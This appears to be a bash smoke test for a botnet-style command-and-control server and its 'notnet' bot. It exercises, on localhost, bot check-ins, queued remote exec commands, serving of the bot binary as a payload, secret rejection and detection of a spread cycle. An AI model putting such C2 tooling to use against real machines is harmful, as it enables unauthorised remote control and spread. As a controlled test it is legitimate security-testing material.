#!/usr/bin/env bash
# c2-server smoke test — real notnet binary against the real C2, end-to-end.
#  1. start c2.py on test ports
#  2. run the bot (notnet-sim-bot image, host network) pointed at it
#  3. assert: heartbeat inventory, targeted + untargeted command delivery,
#     payload serving, wrong-secret rejection
#  4. teardown
set -euo pipefail
cd "$(dirname "$0")"

PORT_HTTP=18080
PORT_PAY=18443
PORT_CON=18090
SECRET=smokesecret
TAG=smoke-bot-1
WORK=/tmp/c2smoke-test
CONF="$WORK/notnet.conf"

cleanup() {
  docker rm -f c2smoke-bot >/dev/null 2>&1 || true
  [ -n "${C2_PID:-}" ] && kill "$C2_PID" 2>/dev/null || true
}
trap cleanup EXIT

rm -rf "$WORK"; mkdir -p "$WORK/queue" "$WORK/payload"
cp ../notnet "$WORK/payload/notnet"

cat > "$CONF" <<EOF
http_server=127.0.0.1
http_port=$PORT_HTTP
http_path=/api/v1/bot
ws_enabled=0
irc_enabled=0
c2_secret=$SECRET
heartbeat_interval=2
scan_interval=1
persist_enabled=0
bot_tag=$TAG
EOF

python3 c2.py --secret "$SECRET" --http-port $PORT_HTTP --payload-port $PORT_PAY \
  --console-port $PORT_CON --queue-dir "$WORK/queue" --payload-dir "$WORK/payload" \
  --db "$WORK/c2.db" > "$WORK/c2.log" 2>&1 &
C2_PID=$!
sleep 2

docker run --rm -d --name c2smoke-bot --network host \
  -v "$CONF":/etc/notnet.conf:ro notnet-sim-bot >/dev/null

API="http://127.0.0.1:$PORT_CON"
fail=0

echo "[1/6] bot heartbeat -> inventory"
for i in $(seq 1 20); do
  n=$(./c2ctl --api "$API" bots | grep -c "$TAG" || true)
  [ "$n" -ge 1 ] && break
  sleep 1
done
./c2ctl --api "$API" bots | grep -q "$TAG" || { echo "FAIL: no bot in inventory"; fail=1; }

echo "[2/6] targeted command delivered + executed"
./c2ctl --api "$API" queue --target "$TAG" exec hostname
for i in $(seq 1 20); do
  docker logs c2smoke-bot 2>&1 | grep -q "CMD: exec: allowlist hit: hostname" && break
  sleep 1
done
docker logs c2smoke-bot 2>&1 | grep -q "CMD: exec: allowlist hit: hostname" \
  || { echo "FAIL: exec hostname not executed"; fail=1; }

echo "[3/6] untargeted command delivered"
./c2ctl --api "$API" queue exec date
for i in $(seq 1 20); do
  docker logs c2smoke-bot 2>&1 | grep -q "CMD: exec: allowlist hit: date" && break
  sleep 1
done
docker logs c2smoke-bot 2>&1 | grep -q "CMD: exec: allowlist hit: date" \
  || { echo "FAIL: exec date not executed"; fail=1; }

echo "[4/6] payload serving"
code=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$PORT_PAY/bot/notnet")
[ "$code" = "200" ] || { echo "FAIL: payload http $code"; fail=1; }

echo "[5/6] wrong secret rejected"
curl -s -X POST "http://127.0.0.1:$PORT_HTTP/api/v1/bot" \
  -d '{"cmd":"status","hostname":"evil","secret":"wrong","tag":"evil-1"}' >/dev/null
sleep 2
grep -q "AUTH-FAIL.*evil" "$WORK/c2.log" || { echo "FAIL: no AUTH-FAIL logged"; fail=1; }

echo "[6/6] bot stays connected (no autonomous spread)"
docker logs c2smoke-bot 2>&1 | grep -q "Local spread cycle started" \
  && { echo "FAIL: bot went autonomous (connection dropped)"; fail=1; }

if [ "$fail" = "0" ]; then
  echo "C2 SMOKE: PASS"
  exit 0
else
  echo "C2 SMOKE: FAIL"
  exit 1
fi
